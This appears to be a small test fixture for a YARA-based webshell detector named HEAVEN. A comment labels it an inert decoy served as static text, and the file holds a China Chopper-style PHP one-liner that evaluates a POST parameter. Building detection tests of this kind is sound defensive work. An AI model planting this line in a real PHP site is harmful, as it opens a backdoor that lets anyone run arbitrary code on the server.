<!-- INERT DECOY (served as static text; there is no PHP interpreter in this
     container, so the line below is returned verbatim and NEVER executed). It
     reproduces the China-Chopper one-liner fingerprint so HEAVEN's generic
     YARA webshell path (PHP_Webshell_Eval_Superglobal) can be proven live. -->
<?php @eval($_POST['pass']); ?>
